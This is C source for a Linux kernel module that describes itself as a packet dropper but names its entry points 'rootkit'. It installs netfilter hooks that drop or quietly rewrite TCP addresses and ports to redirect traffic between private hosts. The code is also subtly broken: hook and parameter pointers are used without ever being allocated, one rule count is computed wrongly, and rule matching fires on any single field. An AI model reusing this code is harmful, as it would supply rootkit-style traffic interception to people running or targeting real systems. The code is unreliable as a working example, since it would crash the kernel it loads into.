#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/netfilter.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/inet.h>
#include <net/checksum.h>

#include "rule.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("HDR");
MODULE_DESCRIPTION("packet dropper");
MODULE_VERSION("0.01");

static struct nf_hook_ops *pre_routing_nfho;
static struct nf_hook_ops *forward_nfho;
struct nf_hook_params *params;

struct rule forward_rules[2] = {
    {
        {
            {}, 
            {ntohl(0xC0A81101), htons(8000)}
        },
        {
            1, 
            {
                {ntohl(0xC0A81180)},
                {ntohl(0xC0A81101), htons(8080)}
            }
        }
    }
};
struct rule pre_routing_rules[1] = {
    {
        {
            {ntohl(0xC0A81101), htons(8080)}, 
            {}
        }, 
        {
            1, 
            {
                {ntohl(0xC0A81101), htons(8000)},
                {ntohl(0xC0A80581)}
            }
        }
    }
};

struct nf_hook_params {
    struct rule *rules;
    int rule_count;
};

struct rule *is_match(struct rule* rules, int rule_count, struct iphdr *ip_header, struct tcphdr *tcp_header) {
    unsigned int i;
    for (i = 0; i < rule_count; i++) {
        struct rule *rule = &rules[i];
        if (rule->filter.src.ip && rule->filter.src.ip == ip_header->saddr) {
            return rule;
        }
        else if (rule->filter.src.port && rule->filter.src.port == tcp_header->source) {
            return rule;
        }
        else if (rule->filter.dst.ip && rule->filter.dst.ip == ip_header->daddr) {
            return rule;
        }
        else if (rule->filter.dst.port && rule->filter.dst.port == tcp_header->dest) {
            return rule;
        }
    }
    return NULL;
}

unsigned int filter_packet(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) {
    struct iphdr *ip_header;
    struct tcphdr *tcp_header;
    struct rule *matched_rule;

    struct nf_hook_params *params = (struct nf_hook_params *)priv;
    
    if (!skb) {
        return NF_ACCEPT;
    }

    ip_header = ip_hdr(skb);
    if (!ip_header || ip_header->protocol != IPPROTO_TCP) {
        return NF_ACCEPT;
    }

    tcp_header = tcp_hdr(skb);
    
    matched_rule = is_match(params->rules, params->rule_count, ip_header, tcp_header);
    if (matched_rule) {
        printk(KERN_INFO "Packet %d:%d to %d:%d matched filter %d:%d to %d:%d\n",
            ip_header->saddr,
            tcp_header->source,
            ip_header->daddr,
            tcp_header->dest,
            matched_rule->filter.src.ip,
            matched_rule->filter.src.port,
            matched_rule->filter.dst.ip,
            matched_rule->filter.dst.port
        );

        switch (matched_rule->action.action_type)
        {
        case DROP:
            printk(KERN_INFO "Dropping packet destined for \n");
            return NF_DROP;
        case ALTER:
            printk(KERN_INFO "Changing packet destined for \n");
            if (matched_rule->action.filter.src.ip) {
                ip_header->saddr = matched_rule->action.filter.src.ip;
            }
            if (matched_rule->action.filter.src.port) {
                tcp_header->source = matched_rule->action.filter.src.port;
            }
            if (matched_rule->action.filter.dst.ip) {
                ip_header->daddr = matched_rule->action.filter.dst.ip;
            }
            if (matched_rule->action.filter.dst.port) {
                tcp_header->dest = matched_rule->action.filter.dst.port;
            }

            // if (!tcp_header->syn || (tcp_header->syn && tcp_header->ack)) {
            //     tcp_header->seq = htonl(ntohl(tcp_header->seq) + 1);
            // }

            ip_header->check = 0;
            
            ip_header->check = ip_fast_csum((unsigned char *)ip_header, ip_header->ihl);
            
            tcp_header->check = 0; // Reset the checksum field
            tcp_header->check = csum_tcpudp_magic(ip_header->saddr, ip_header->daddr,
                                                ntohs(ip_header->tot_len) - (ip_header->ihl << 2),
                                                IPPROTO_TCP, csum_partial((unsigned char *)tcp_header,
                                                                            ntohs(ip_header->tot_len) - (ip_header->ihl << 2),
                                                                            0));
            break;
        default:
            break;
        }
    }

    return NF_ACCEPT;
}

void print_rules(struct rule* rules, int rule_count) {
    unsigned int i = 0;
    for (i = 0; i < rule_count; i++)
    {
        printk(KERN_INFO "Rule: filter: %d:%d to %d:%d action: %d:%d to %d:%d",
            rules[i].filter.src.ip,
            rules[i].filter.src.port,
            rules[i].filter.dst.ip,
            rules[i].filter.dst.port,
            rules[i].action.filter.src.ip,
            rules[i].action.filter.src.port,
            rules[i].action.filter.dst.ip,
            rules[i].action.filter.dst.port
        );
    }
}

int register_routing_hook(struct nf_hook_ops *nfho, enum nf_inet_hooks hooknum, struct rule * rules, int rule_count) {
    memset(nfho, 0, sizeof(struct nf_hook_ops));
    memset(params, 0, sizeof(struct nf_hook_params));

    params->rules = rules;
    params->rule_count = rule_count;

    nfho->hook = filter_packet;
    nfho->pf = PF_INET;
    nfho->hooknum = hooknum;
    nfho->priority = 0;
    nfho->priv = params;

    if (nf_register_net_hook(&init_net, nfho)) {
        printk(KERN_ERR "Failed to register Netfilter hook\n");
        return -1;
    }

    print_rules(rules, rule_count);

    return 0;
}

static int __init rootkit_init(void)
{
    register_routing_hook(pre_routing_nfho, NF_INET_PRE_ROUTING, pre_routing_rules, sizeof(pre_routing_nfho) / sizeof(struct rule));
    register_routing_hook(forward_nfho, NF_INET_FORWARD, forward_rules, sizeof(forward_rules) / sizeof(struct rule));

    printk(KERN_INFO "rootkit: loaded\n");
    return 0;
}

static void __exit rootkit_exit(void)
{
    nf_unregister_net_hook(&init_net, pre_routing_nfho);
    nf_unregister_net_hook(&init_net, forward_nfho);
    printk(KERN_INFO "rootkit: unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
